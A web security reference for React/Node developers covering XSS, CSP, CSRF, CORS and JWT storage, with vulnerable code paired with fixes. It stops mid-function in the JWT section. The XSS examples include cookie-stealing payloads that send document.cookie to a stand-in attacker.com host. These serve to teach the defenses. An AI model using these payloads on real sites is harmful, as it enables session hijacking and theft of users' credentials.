# Web Security — Frontend & Fullstack Deep Reference

**Priority: HIGH**

> Focused on frontend-specific and fullstack web security concerns: XSS attack mechanics and React defenses, CSP configuration, CORS internals, JWT storage tradeoffs, clickjacking, security headers, SRI, prototype pollution, dependency supply chain, HTTPS/TLS, and OAuth 2.0/OIDC for SPAs.
>
> For OWASP Top 10, SQL injection, HIPAA, and backend-oriented security see `SECURITY-HIGH-DEEP.md`.

---

## Table of Contents

1. [XSS — All Three Types, Deep Dive](#1-xss--all-three-types-deep-dive)
2. [Content Security Policy (CSP)](#2-content-security-policy-csp)
3. [CSRF — How It Works and Modern Defenses](#3-csrf--how-it-works-and-modern-defenses)
4. [CORS — Deep Dive](#4-cors--deep-dive)
5. [JWT Security — Storage and Validation](#5-jwt-security--storage-and-validation)
6. [Clickjacking](#6-clickjacking)
7. [Security Headers — Full Production Checklist](#7-security-headers--full-production-checklist)
8. [Subresource Integrity (SRI)](#8-subresource-integrity-sri)
9. [Prototype Pollution](#9-prototype-pollution)
10. [Dependency Security](#10-dependency-security)
11. [HTTPS and TLS](#11-https-and-tls)
12. [Auth Patterns — OAuth 2.0 and OpenID Connect](#12-auth-patterns--oauth-20-and-openid-connect)
13. [Secure Coding Checklist for React/Node.js Apps](#13-secure-coding-checklist-for-reactnodejs-apps)
14. [Common Interview Questions](#14-common-interview-questions)

---

## 1. XSS — All Three Types, Deep Dive

### What XSS actually is

```text
XSS (Cross-Site Scripting): attacker injects JavaScript into a page.
The browser executes it because it trusts the page's origin.

Once JS runs under your origin, the attacker can:
  - Steal document.cookie (session hijacking)
  - Read localStorage / sessionStorage (token theft)
  - Make authenticated API requests on the user's behalf
  - Log keystrokes (capture passwords as the user types)
  - Rewrite the DOM (fake login forms, phishing)
  - Exfiltrate data to attacker-controlled server via fetch()

Three types differ in WHERE the payload lives and how it reaches the browser.
```

---

### Type 1 — Stored XSS (Persistent)

```text
Attack flow:
  1. Attacker submits malicious content to the app (comment, profile bio, etc.)
  2. App stores it in the database without sanitizing
  3. Every user who views that page receives the payload in their HTML
  4. Browser executes the script under the app's origin

Severity: HIGH — one submission harms ALL users, can persist for months.
```

```js
// ATTACK EXAMPLE: attacker submits this as a comment
// The payload gets stored in the DB as-is
const maliciousComment = `Nice post! <script>
  fetch('https://attacker.com/steal?c=' + document.cookie);
</script>`;

// SERVER SIDE — vulnerable: rendering raw content into HTML template
// (Express + template engine)
app.get('/post/:id', async (req, res) => {
  const post = await db.query('SELECT * FROM posts WHERE id = ?', [req.params.id]);
  const comments = await db.query('SELECT * FROM comments WHERE post_id = ?', [req.params.id]);

  // VULNERABLE: directly interpolating comment.body into HTML
  const commentsHtml = comments.map(c => `<div>${c.body}</div>`).join('');
  res.send(`<html><body>${commentsHtml}</body></html>`);
});

// DEFENSE — Server side: HTML-encode output before rendering
const he = require('he'); // HTML entities library

const commentsHtml = comments.map(c =>
  `<div>${he.encode(c.body)}</div>` // encodes <, >, ", ', & to HTML entities
).join('');
// Now <script> becomes &lt;script&gt; — rendered as text, never executed

// DEFENSE — React side: React escapes by default
// If you store the comment and render it in React, it's safe UNLESS you use dangerouslySetInnerHTML
function Comment({ body }) {
  return <div>{body}</div>; // SAFE — React encodes before DOM insertion
}
```

---

### Type 2 — Reflected XSS

```text
Attack flow:
  1. Attacker crafts a URL with a malicious query parameter
     https://yourapp.com/search?q=<script>stealCookies()</script>
  2. Victim clicks the link (from phishing email, malicious site, etc.)
  3. Server reads req.query.q and reflects it verbatim into the HTML response
  4. Browser executes the script

Severity: MEDIUM — requires tricking users into clicking a crafted URL.
Often used with URL shorteners to hide the payload.
```

```js
// ATTACK URL (URL-encoded in real life):
// /search?q=<script>document.location='https://attacker.com/?c='+document.cookie</script>

// VULNERABLE server: reflecting query param directly into HTML
app.get('/search', (req, res) => {
  const q = req.query.q;
  res.send(`<html><body>
    <h1>Search results for: ${q}</h1>  <!-- VULNERABLE -->
  </body></html>`);
});

// DEFENSE — always encode reflected values
const he = require('he');
app.get('/search', (req, res) => {
  const q = he.encode(req.query.q || '');
  res.send(`<html><body>
    <h1>Search results for: ${q}</h1>  <!-- SAFE -->
  </body></html>`);
});

// With a template engine like EJS, use <%= %> (escaped) not <%- %> (raw)
// <%- searchTerm %>  ← VULNERABLE (raw output)
// <%= searchTerm %>  ← SAFE (HTML-escaped output)
```

---

### Type 3 — DOM-Based XSS

```text
Attack flow:
  1. Server sends a perfectly fine HTML response — the server is NOT involved
  2. Client-side JavaScript reads attacker-controlled data (URL hash, query string,
     postMessage, localStorage, referrer) and writes it to the DOM unsafely
  3. Browser executes the injected script

This is entirely client-side and cannot be caught by server-side output encoding.
CSP is your main defense at the policy level.

Common vulnerable sinks (places where data is written to DOM):
  - element.innerHTML = untrustedData
  - document.write(untrustedData)
  - eval(untrustedData)
  - setTimeout(untrustedData)         ← string form only
  - element.setAttribute('href', untrustedData)  ← can inject javascript: URLs
  - location.href = untrustedData

Common sources (places attacker controls):
  - location.hash         ← never sent to server, pure client
  - location.search       ← query params
  - document.referrer
  - postMessage data
  - localStorage / sessionStorage  ← if another XSS wrote there first
```

```js
// ATTACK URL:
// https://yourapp.com/page#<img src=x onerror="stealCookies()">

// VULNERABLE: reading hash and writing to DOM without sanitization
const fragment = decodeURIComponent(location.hash.slice(1));
document.getElementById('welcome').innerHTML = fragment; // VULNERABLE

// DEFENSE 1: use textContent instead of innerHTML
// textContent treats the value as plain text — no HTML parsing, no script execution
document.getElementById('welcome').textContent = fragment; // SAFE

// DEFENSE 2: if you MUST render HTML (e.g. rich text editor output),
// use DOMPurify to sanitize BEFORE setting innerHTML
import DOMPurify from 'dompurify';

const clean = DOMPurify.sanitize(fragment);
document.getElementById('welcome').innerHTML = clean; // SAFE

// DOMPurify strips dangerous tags and attributes:
// <script>...</script>  → removed
// <img onerror="...">   → onerror attribute removed
// <a href="javascript:..."> → href stripped

// DEFENSE 3: avoid document.write entirely — it has no safe mode
// document.write(userInput)  ← always wrong, replace with DOM APIs

// DEFENSE 4: Trusted Types API (modern browsers)
// Enforces that only explicitly created "trusted" values can be assigned to innerHTML
// Configured via CSP: require-trusted-types-for 'script'
// Then in JS:
const policy = trustedTypes.createPolicy('default', {
  createHTML: (input) => DOMPurify.sanitize(input)
});
element.innerHTML = policy.createHTML(userInput); // SAFE — sanitized through policy
```

---

### React-Specific XSS Context

```text
React escapes all JSX expressions by default before inserting into the DOM.
This means {userInput} in JSX is ALWAYS safe — React calls
document.createTextNode() internally, not innerHTML.

The ONLY way to get XSS in React is:
  1. dangerouslySetInnerHTML — opt-in to raw HTML
  2. Using href/src with user-controlled javascript: URLs
  3. Using a third-party component that calls innerHTML internally
  4. Server-Side Rendering (SSR) without proper escaping of __INITIAL_STATE__
```

```jsx
// VULNERABLE in React — dangerouslySetInnerHTML with unsanitized content
function BlogPost({ post }) {
  return (
    <div
      dangerouslySetInnerHTML={{ __html: post.content }}  // VULNERABLE if content is unsanitized
    />
  );
}

// SAFE — sanitize with DOMPurify before passing to dangerouslySetInnerHTML
import DOMPurify from 'dompurify';

function BlogPost({ post }) {
  const cleanHtml = DOMPurify.sanitize(post.content);
  return (
    <div dangerouslySetInnerHTML={{ __html: cleanHtml }} />  // SAFE
  );
}

// VULNERABLE — javascript: URL in href
function UserProfile({ user }) {
  return <a href={user.website}>Visit website</a>; // VULNERABLE if website = "javascript:stealCookies()"
}

// SAFE — validate URL scheme before rendering
function UserProfile({ user }) {
  const safeUrl = user.website?.startsWith('https://') || user.website?.startsWith('http://')
    ? user.website
    : '#';
  return <a href={safeUrl} rel="noopener noreferrer">Visit website</a>; // SAFE
}

// VULNERABLE — SSR: embedding JSON in script tag without escaping
// Next.js __NEXT_DATA__ style:
const html = `<script>window.__INITIAL__ = ${JSON.stringify(data)}</script>`;
// If data contains </script>, it breaks out of the script tag — classic SSR XSS

// SAFE — use a library that escapes </script> in JSON for HTML embedding
const serialize = require('serialize-javascript');
const html = `<script>window.__INITIAL__ = ${serialize(data)}</script>`;
// serialize-javascript escapes </script>, </, and <!-- sequences
```

---

## 2. Content Security Policy (CSP)

### What CSP is and how it blocks XSS

```text
CSP is an HTTP response header that tells the browser WHERE scripts, styles,
images, and other resources are allowed to load from.

Even if an attacker injects <script>evil()</script> into your HTML, the browser
will REFUSE to execute it if CSP does not allow inline scripts from that source.

The browser enforces CSP — your server just declares the policy via header.

Delivered as:
  Content-Security-Policy: policy-directives

Or in a <meta> tag (note: meta tag cannot set some directives like frame-ancestors):
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
```

### Key Directives

```text
default-src     ← fallback for any fetch directive not explicitly set
                   default-src 'self' means: only load from same origin by default

script-src      ← controls where JavaScript can be loaded and executed FROM
                   'self'          = same origin scripts OK
                   'unsafe-inline' = allows inline <script> tags — DO NOT USE
                   'unsafe-eval'   = allows eval(), Function() — DO NOT USE
                   https://cdn.example.com = allow scripts from this specific CDN

style-src       ← controls CSS sources
                   'unsafe-inline' here allows style= attributes (less dangerous than script)

img-src         ← controls where images can load from
                   img-src 'self' data: https:  = self, data URIs, and any HTTPS

connect-src     ← controls fetch(), XHR, WebSocket destinations
                   If a fetch() call goes to a URL not listed here, browser blocks it

font-src        ← web fonts (Google Fonts, etc.)

frame-src       ← what origins can be loaded in <iframe> inside YOUR page
frame-ancestors ← what origins can embed YOUR page in an iframe (clickjacking defense)

form-action     ← where forms can be submitted (POST target)
                   Prevents form hijacking even without script

base-uri        ← restricts <base href="..."> injection, which could redirect relative URLs

upgrade-insecure-requests  ← tells browser to upgrade http:// requests to https:// automatically
```

```js
// Express: setting CSP header with helmet
const helmet = require('helmet');

app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc:     ["'self'"],
    scriptSrc:      ["'self'", "https://cdn.jsdelivr.net"],
    styleSrc:       ["'self'", "https://fonts.googleapis.com"],
    fontSrc:        ["'self'", "https://fonts.gstatic.com"],
    imgSrc:         ["'self'", "data:", "https:"],
    connectSrc:     ["'self'", "https://api.myapp.com"],
    frameSrc:       ["'none'"],
    frameAncestors: ["'none'"],   // clickjacking defense — nobody can iframe this app
    formAction:     ["'self'"],
    baseUri:        ["'self'"],
    upgradeInsecureRequests: [],
  },
}));

// Or as a raw header string:
res.setHeader(
  'Content-Security-Policy',
  "default-src 'self'; script-src 'self' https://cdn.jsdelivr.net; frame-ancestors 'none'"
);
```

---

### Nonce-Based CSP

```text
Problem: strict CSP (no 'unsafe-inline') breaks inline scripts. But many apps
legitimately need some inline scripts (e.g. SSR hydration, analytics snippets).

Solution: nonces — a random token generated per-request.
  - Server generates a cryptographically random value (nonce) for each HTTP response
  - Server includes the nonce in the CSP header: script-src 'nonce-<value>'
  - Server also adds nonce="<value>" attribute to every legitimate inline <script>
  - Browser only executes inline scripts whose nonce matches the one in CSP
  - Attacker-injected <script> tags have no nonce → blocked

The nonce must be:
  - Cryptographically random (crypto.randomBytes, not Math.random)
  - Unique per response (never reuse)
  - At least 128 bits / 16 bytes of entropy
```

```js
// Express middleware: generate nonce and attach to res.locals
const crypto = require('crypto');

app.use((req, res, next) => {
  const nonce = crypto.randomBytes(16).toString('base64');
  res.locals.nonce = nonce;

  res.setHeader(
    'Content-Security-Policy',
    `default-src 'self'; script-src 'self' 'nonce-${nonce}'; style-src 'self' 'nonce-${nonce}'`
  );
  next();
});

// In your HTML template (EJS example):
// <script nonce="<%= nonce %>">
//   window.__INITIAL_STATE__ = <%- serialize(initialState) %>;
// </script>
// The nonce attribute value matches the CSP → browser allows execution

// Next.js: CSP with nonces (Next.js 13+ middleware)
// middleware.ts
import { NextResponse } from 'next/server';
import crypto from 'crypto';

export function middleware(request) {
  const nonce = Buffer.from(crypto.randomUUID()).toString('base64');
  const cspHeader = `
    default-src 'self';
    script-src 'self' 'nonce-${nonce}' 'strict-dynamic';
    style-src 'self' 'nonce-${nonce}';
    img-src 'self' blob: data:;
    font-src 'self';
    object-src 'none';
    base-uri 'self';
    form-action 'self';
    frame-ancestors 'none';
  `.replace(/\s{2,}/g, ' ').trim();

  const response = NextResponse.next();
  response.headers.set('Content-Security-Policy', cspHeader);
  response.headers.set('x-nonce', nonce); // pass to page component via request headers
  return response;
}
```

---

### Hash-Based CSP

```text
Alternative to nonces: hash the exact content of the inline script.
  - Server computes SHA-256 hash of the script content
  - Includes it in CSP: script-src 'sha256-<base64hash>'
  - Browser hashes the inline script content and compares — only runs if it matches

Advantage: no need to generate per-request nonces (good for static sites)
Disadvantage: any change to the script content requires updating the hash in CSP
Use nonces for dynamic content, hashes for static inline scripts
```

```bash
# How to compute the hash for a known inline script:
echo -n "console.log('hello');" | openssl dgst -binary -sha256 | openssl base64
# Output: jHkNBwMH5M8GVrVfhfLZ7pN+pXxFmN7WUqLR9jIfcFA=

# In CSP header:
# script-src 'sha256-jHkNBwMH5M8GVrVfhfLZ7pN+pXxFmN7WUqLR9jIfcFA='
```

---

### Report-Only Mode

```text
Content-Security-Policy-Report-Only: same directives; no enforcement.
Browser sends violation reports to report-uri but does NOT block resources.

USE THIS to:
  1. Test a new CSP policy in production without breaking anything
  2. Discover what would be blocked before switching to enforcement mode
  3. Monitor for injection attempts in production

Workflow:
  1. Deploy with Report-Only + report-uri pointing to your logging endpoint
  2. Observe reports for a week — identify legitimate resources that need whitelisting
  3. Adjust directives to allow legitimate sources
  4. Switch to Content-Security-Policy (enforcing)
  5. Keep Report-Only running alongside enforcing header to catch new violations
```

```js
// Express: Report-Only mode
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy-Report-Only',
    "default-src 'self'; script-src 'self'; report-uri /csp-violation-report"
  );
  next();
});

// Endpoint to receive CSP violation reports
// Browser POSTs JSON to this URL when a resource is blocked (in report-only mode)
app.post('/csp-violation-report', express.json({ type: 'application/csp-report' }), (req, res) => {
  console.log('CSP Violation:', JSON.stringify(req.body['csp-report'], null, 2));
  // Log to your monitoring system (Datadog, Sentry, etc.)
  res.status(204).end();
});

// Example violation report body:
// {
//   "csp-report": {
//     "document-uri": "https://myapp.com/page",
//     "violated-directive": "script-src-elem",
//     "blocked-uri": "https://evil.com/malware.js",
//     "source-file": "https://myapp.com/page",
//     "line-number": 23,
//     "column-number": 10
//   }
// }
```

---

### Common CSP Mistakes

```text
'unsafe-inline' in script-src:
  → Completely defeats XSS protection. Any injected <script> will run.
  → Often added because inline scripts "broke" — use nonces instead.

'unsafe-eval' in script-src:
  → Allows eval(), new Function(), setTimeout(string), setInterval(string)
  → Required by some legacy libraries (AngularJS). Avoid if possible.
  → If needed for a specific script, use 'unsafe-eval' only in that component.

Wildcard origins: script-src https: or script-src *
  → Allows scripts from any HTTPS site — attacker can host a script on any domain.

Forgetting connect-src:
  → Script might be blocked but fetch() to attacker.com still works for data exfiltration.
  → Always include connect-src to restrict outbound requests.

Using only a <meta> CSP tag:
  → frame-ancestors is ignored in <meta> CSP — must be in the HTTP header.

Not using strict-dynamic:
  → 'strict-dynamic' makes whitelisted scripts trusted, and allows THEM to load
     additional scripts dynamically (for modern frameworks with script loaders).
  → Without it, you end up whitelisting many CDN URLs, which widens the attack surface.
```

---

## 3. CSRF — How It Works and Modern Defenses

### The attack mechanism

```text
CSRF (Cross-Site Request Forgery): attacker tricks a logged-in user's browser
into sending an authenticated request to your server without the user's intent.

Why it works:
  Browsers automatically attach cookies to requests — regardless of which site
  triggered the request. So if a user is logged in to bank.com, visiting
  evil.com can trigger a request to bank.com that arrives with the user's
  session cookie attached.

Attack example:
  1. User is logged in to bank.com — has a session cookie: session=abc123
  2. User visits evil.com (a malicious page)
  3. evil.com has: <img src="https://bank.com/transfer?to=attacker&amount=1000">
  4. Browser fetches that URL and automatically sends the session cookie
  5. bank.com receives an authenticated GET request that transfers money
  6. Or for POST: evil.com auto-submits a hidden form to bank.com

Key insight: CSRF exploits the browser's automatic cookie attachment.
It does NOT steal the cookie — it doesn't need to.
CSRF only works when:
  - The action requires only a cookie for auth (no custom headers)
  - The request is a "simple" request (forms, img tags, standard fetch)
```

---

### SameSite Cookie Attribute — The Modern Defense

```text
SameSite tells the browser whether to send a cookie with cross-site requests.

SameSite=Strict:
  Cookie is NEVER sent on any cross-site request.
  Even if user clicks a link from another site → no cookie.
  Downside: if user is on reddit.com and clicks a link to yourapp.com,
  they arrive NOT logged in (session cookie not sent on the navigation).
  Best for: admin dashboards, banking, high-security apps.

SameSite=Lax (DEFAULT in modern browsers):
  Cookie is sent on cross-site TOP-LEVEL navigations (link clicks, redirects)
  but NOT on cross-site sub-requests (img, iframe, fetch, form POST).
  Protects against CSRF for most practical attacks while preserving UX.
  Most apps should use Lax.

SameSite=None:
  Cookie is sent on all cross-site requests.
  REQUIRES Secure attribute (HTTPS-only) — browser rejects None without Secure.
  Use only when genuinely needed: third-party widgets, iframes, cross-origin APIs.

In 2020+ Chrome changed the default from no SameSite attribute to Lax.
Always set SameSite explicitly — don't rely on browser defaults.
```

```js
// Express: setting cookies with SameSite
res.cookie('sessionId', token, {
  httpOnly: true,       // not accessible via JS (blocks XSS cookie theft)
  secure: true,         // HTTPS only
  sameSite: 'lax',      // 'strict' | 'lax' | 'none'
  maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days in ms
  path: '/',
});

// express-session configuration
app.use(session({
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 24 * 60 * 60 * 1000, // 1 day
  }
}));
```

---

### CSRF Tokens

```text
Synchronizer Token Pattern (traditional approach):
  1. Server generates a random token per session (or per form)
  2. Token is embedded in the HTML form as a hidden field
  3. When form submits, token is sent in the POST body
  4. Server verifies the token matches the session's token
  5. Attacker cannot know the token (same-origin policy prevents reading it)

Double Submit Cookie Pattern (stateless alternative):
  1. Server sets a non-httpOnly cookie with a random CSRF token
  2. JavaScript reads the cookie and includes it in a custom request header
     (e.g., X-CSRF-Token: <value>)
  3. Server verifies cookie value === header value
  4. Attacker's site cannot READ your cookie (same-origin policy) so cannot set the header
  Note: this breaks if there's a subdomain XSS vulnerability

When CSRF does NOT apply:
  - JSON APIs where Content-Type: application/json is required
    → Content-Type: application/json is NOT a "simple" header → triggers CORS preflight
    → If CORS is properly configured, cross-origin POSTs with application/json are blocked
    → BUT still use CSRF protection if you accept both JSON and form submissions
  - CORS + custom headers (e.g., Authorization: Bearer ...)
    → Custom headers trigger CORS preflight, which enforces origin checks
    → Attacker cannot make a request with a custom header from a different origin
    → Still add SameSite cookies as defense-in-depth
  - APIs used only by mobile apps (no browser cookies)
```

```js
// Express CSRF token middleware with csurf (legacy) or manual implementation
// Note: csurf is deprecated — modern approach is SameSite cookies + custom header check

// Manual CSRF protection for form-based apps:
const crypto = require('crypto');

function generateCsrfToken() {
  return crypto.randomBytes(32).toString('hex');
}

// Generate and store on session when serving the form
app.get('/transfer', (req, res) => {
  if (!req.session.csrfToken) {
    req.session.csrfToken = generateCsrfToken();
  }
  res.render('transfer', { csrfToken: req.session.csrfToken });
});

// Verify on form submission
app.post('/transfer', (req, res) => {
  const { csrfToken, amount, toAccount } = req.body;

  // Constant-time comparison to prevent timing attacks
  const validToken = req.session.csrfToken;
  const receivedToken = csrfToken;

  if (!validToken || !receivedToken ||
      !crypto.timingSafeEqual(Buffer.from(validToken), Buffer.from(receivedToken))) {
    return res.status(403).json({ error: 'Invalid CSRF token' });
  }

  // Rotate token after use
  req.session.csrfToken = generateCsrfToken();

  // Process the transfer...
});

// React: including CSRF token in fetch requests (double-submit cookie pattern)
// Server sets: Set-Cookie: csrf_token=abc123 (NOT httpOnly — JS needs to read it)
function getCsrfToken() {
  return document.cookie
    .split('; ')
    .find(row => row.startsWith('csrf_token='))
    ?.split('=')[1];
}

async function submitTransfer(data) {
  const response = await fetch('/api/transfer', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json',
      'X-CSRF-Token': getCsrfToken(), // server checks this matches the cookie
    },
    credentials: 'include', // send session cookie
    body: JSON.stringify(data),
  });
}
```

---

## 4. CORS — Deep Dive

### The Same-Origin Policy

```text
Same-Origin Policy (SOP): fundamental browser security model.
Two URLs have the same origin if ALL THREE match: protocol + host + port.

https://app.com:443/page  vs:
  https://app.com/other         → SAME ORIGIN (port 443 is default for https)
  http://app.com/page           → DIFFERENT (protocol differs)
  https://api.app.com/page      → DIFFERENT (host differs — subdomain counts)
  https://app.com:8080/page     → DIFFERENT (port differs)

What SOP BLOCKS (cross-origin):
  - fetch() / XHR reading the response body
  - Access to iframe's contentDocument if different origin
  - Reading cookies from another origin

What SOP does NOT block (cross-origin requests still SENT):
  - <img src="https://other.com/img.png">  ← sends GET, can't read response
  - <script src="https://other.com/js">    ← can load and execute (this is how CDNs work)
  - <form action="https://other.com">      ← can POST, can't read response
  - CSS loaded via <link>
  Note: these ARE blocked from READING the response — this is why CSRF works
  (form submits succeed), but data theft via XHR is blocked.

CORS (Cross-Origin Resource Sharing): a mechanism for servers to RELAX SOP
by explicitly telling the browser "this origin is allowed to read my responses".
```

---

### Simple vs Preflighted Requests

```text
SIMPLE REQUEST — no preflight, browser sends directly:
  Methods: GET, POST, HEAD
  Headers: only: Accept, Accept-Language, Content-Language, Content-Type
  Content-Type restricted to: text/plain, multipart/form-data, application/x-www-form-urlencoded

  Browser sends the request WITH the CORS Origin header.
  If server responds with Access-Control-Allow-Origin matching the origin,
  browser allows JS to read the response. Otherwise, the request was sent
  (server processed it) but JS cannot read the response.

PREFLIGHTED REQUEST — browser sends OPTIONS first:
  Triggered by: non-simple methods (PUT, DELETE, PATCH)
    OR non-simple headers (Authorization, Content-Type: application/json, custom headers)
  
  Step 1: Browser sends OPTIONS preflight:
    OPTIONS /api/data HTTP/1.1
    Origin: https://frontend.com
    Access-Control-Request-Method: DELETE
    Access-Control-Request-Headers: Content-Type, Authorization

  Step 2: Server must respond with:
    Access-Control-Allow-Origin: https://frontend.com
    Access-Control-Allow-Methods: GET, POST, DELETE
    Access-Control-Allow-Headers: Content-Type, Authorization
    Access-Control-Max-Age: 86400  ← cache preflight for 24 hours (avoid repeated OPTIONS)

  Step 3: If preflight approved, browser sends the actual request.

WHY THIS MATTERS for CSRF:
  A cross-origin POST with Content-Type: application/json triggers a preflight.
  If your CORS config doesn't allow the attacker's origin, the preflight is rejected
  and the actual request is NEVER sent. This is why JSON APIs need less CSRF protection.
```

```js
// Express CORS configuration with cors package
const cors = require('cors');

// Option 1: Simple — allow a single origin
app.use(cors({
  origin: 'https://myfrontend.com',
  methods: ['GET', 'POST', 'PUT', 'DELETE'],
  allowedHeaders: ['Content-Type', 'Authorization'],
  credentials: true,           // allow cookies/auth headers
  maxAge: 86400,               // preflight cache: 1 day
}));

// Option 2: Dynamic origin whitelist (multi-tenant, multiple environments)
const allowedOrigins = [
  'https://app.mycompany.com',
  'https://staging.mycompany.com',
  'http://localhost:3000',  // dev
];

app.use(cors({
  origin: (origin, callback) => {
    // Allow requests with no origin (curl, Postman, mobile apps)
    if (!origin) return callback(null, true);
    if (allowedOrigins.includes(origin)) {
      callback(null, true);
    } else {
      callback(new Error(`CORS: origin ${origin} not allowed`));
    }
  },
  credentials: true,
}));

// Option 3: Manual CORS headers (no package — full control)
app.use((req, res, next) => {
  const origin = req.headers.origin;
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Vary', 'Origin'); // IMPORTANT: tell CDNs this response varies by Origin
  }
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  res.setHeader('Access-Control-Max-Age', '86400');

  if (req.method === 'OPTIONS') {
    return res.status(204).end(); // preflight complete
  }
  next();
});
```

---

### Credentials and Cookies Across Origins

```text
By default, cross-origin fetch() does NOT send cookies or Authorization headers.
To send them:
  - Client must set: credentials: 'include'
  - Server must respond: Access-Control-Allow-Credentials: true
  - Server MUST NOT use Access-Control-Allow-Origin: * when credentials are true
    (browser will refuse — this combination is explicitly invalid)
  - Server must specify the exact origin, not a wildcard

If you set * AND credentials: true → browser throws:
  "The value of the 'Access-Control-Allow-Credentials' header in the response is ''
   which must be 'true' when the request's credentials mode is 'include'."
  (In some browsers: "Access-Control-Allow-Origin cannot be '*' when credentials mode is 'include'")
```

```js
// Client side: sending cookies with cross-origin request
const response = await fetch('https://api.myapp.com/user', {
  method: 'GET',
  credentials: 'include',  // send cookies; default is 'same-origin'
  headers: {
    'Content-Type': 'application/json',
    'Authorization': `Bearer ${token}`,
  },
});

// Axios equivalent:
axios.get('https://api.myapp.com/user', {
  withCredentials: true,  // equivalent to credentials: 'include'
  headers: { Authorization: `Bearer ${token}` },
});

// Server: MUST echo back specific origin, never * with credentials
// This is why the dynamic origin function approach above is correct.
```

---

### Common CORS Misconfigurations

```text
1. Access-Control-Allow-Origin: *  +  Access-Control-Allow-Credentials: true
   → Invalid combination. Browsers reject it. But some older browsers accept it,
     meaning any site can make credentialed requests to your API.

2. Reflecting the Origin header without validation:
   → if (req.headers.origin) res.setHeader('Access-Control-Allow-Origin', req.headers.origin)
   → This allows ANY origin — same as *. Attacker can read your API responses.
   → Always validate against a whitelist before reflecting.

3. Overly broad regex matching:
   → if (origin.match(/mycompany\.com/)) { allow }
   → An attacker registers "evilmycompany.com" or "mycompany.com.evil.com"
   → Use exact match or anchor the regex properly: /^https:\/\/mycompany\.com$/

4. Forgetting the Vary: Origin header:
   → If a CDN caches a response with Access-Control-Allow-Origin: https://a.com
     and serves it to a request from https://b.com, CORS fails.
   → Always set Vary: Origin when using dynamic CORS.

5. Allowing http:// origins in production:
   → Allows MitM on the allowed origin — only whitelist https:// in production.
```

---

## 5. JWT Security — Storage and Validation

### Where to store tokens — the core tradeoff

```text
Two main options: localStorage vs httpOnly cookies.

localStorage:
  + Simple to implement — token = localStorage.getItem('jwt')
  + Works easily with any fetch() call — manual header attachment
  - VULNERABLE TO XSS: any JavaScript on your page can read localStorage
    If you have XSS, attacker gets the token: localStorage.getItem('jwt')
    Token theft = permanent access (until expiry) from attacker's server

httpOnly Cookie:
  + NOT accessible via JavaScript — even XSS cannot read it
  + Browser sends it automatically with requests
  - Vulnerable to CSRF — requires SameSite attribute as defense
  - Slightly more complex setup (CORS + credentials)

The answer for most production apps:
  Use httpOnly + Secure + SameSite=Lax cookies.
  This eliminates token theft via XSS.
  SameSite=Lax eliminates most CSRF.
  Add explicit CSRF token for state-changing actions if using SameSite=None.

Memory (in-memory variable):
  Stored in a React state variable or module-level variable.
  + Not accessible via XSS (XSS can't access module scope)
  + Not sent automatically (no CSRF risk)
  - Lost on page refresh — requires refresh token to restore
  - Complex to implement correctly

The "in-memory access token + httpOnly refresh token" pattern:
  Access token: stored in memory (short-lived, 15 minutes)
  Refresh token: httpOnly cookie (long-lived, 7-30 days)
  On page load: app calls /refresh endpoint → gets new access token into memory
  XSS gets the in-memory access token (15 min window) but NOT the refresh token
```

```js
// Express: issuing JWT as httpOnly cookie after login
const jwt = require('jsonwebtoken');

app.post('/auth/login', async (req, res) => {
  const { email, password } = req.body;
  const user = await verifyCredentials(email, password);
  if (!user) return res.status(401).json({ error: 'Invalid credentials' });

  const accessToken = jwt.sign(
    { sub: user.id, email: user.email, role: user.role },
    process.env.JWT_SECRET,
    { expiresIn: '15m', issuer: 'myapp', audience: 'myapp-api' }
  );

  const refreshToken = jwt.sign(
    { sub: user.id, type: 'refresh' },
    process.env.JWT_REFRESH_SECRET,
    { expiresIn: '7d' }
  );

  // Refresh token: httpOnly cookie (JS cannot read)
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'lax',
    maxAge: 7 * 24 * 60 * 60 * 1000, // 7 days
    path: '/auth/refresh', // only sent to the refresh endpoint
  });

  // Access token: in response body — frontend stores in memory
  res.json({ accessToken, expiresIn: 900 });
});

// Refresh endpoint
app.post('/auth/refresh', async (req, res) => {
  const refreshToken = req.cookies.refreshToken;
  if (!refreshToken) return res.status(401).json({ error: 'No refresh token' });

  try {
    const payload = jwt.verify(refreshToken, process.env.JWT_REFRESH_SECRET, {
      issuer: 'myapp',
    });

    // Check refresh token hasn't been revoked (database lookup)
    const isRevoked = await checkRevoked(refreshToken);
    if (isRevoked) return res.status(401).json({ error: 'Token revoked' });

    // Issue new access token
    const newAccessToken = jwt.sign(
      { sub: payload.sub },
      process.env.JWT_SECRET,
      { expiresIn: '15m', issuer: 'myapp', audience: 'myapp-api' }
    );

    // Refresh token rotation: issue new refresh token, revoke old one
    const newRefreshToken = jwt.sign(
      { sub: payload.sub, type: 'refresh' },
      process.env.JWT_REFRESH_SECRET,
      { expiresIn: '7d' }
    );
    await revokeToken(refreshToken);

    res.cookie('refreshToken', newRefreshToken, {
      httpOnly: true, secure: true, sameSite: 'lax',
      maxAge: 7 * 24 * 60 * 60 * 1000, path: '/auth/refresh',
    });

    res.json({ accessToken: newAccessToken });
  } catch (err) {
    res.status(401).json({ error: 'Invalid refresh token' });
  }
});
```

---

### JWT Claims Validation

```text
NEVER just decode a JWT to read claims — ALWAYS VERIFY the signature.
After signature verification, still validate the claims:

exp (expiration):   unix timestamp after which token is invalid
  → jwt.verify() checks this automatically — throws TokenExpiredError
nbf (not before):   token not valid before this timestamp (optional)
iss (issuer):       who issued the token — your app's identifier
  → prevents tokens from one service being used with another
aud (audience):     intended recipient — your API's identifier
  → prevents tokens issued for service A being used on service B
sub (subject):      the user ID — verify the user still exists and isn't banned
jti (JWT ID):       unique token identifier — useful for revocation lists
```

```js
// Express middleware: verify JWT with full claims validation
const jwt = require('jsonwebtoken');

async function requireAuth(req, res, next) {
  const authHeader = req.headers.authorization;
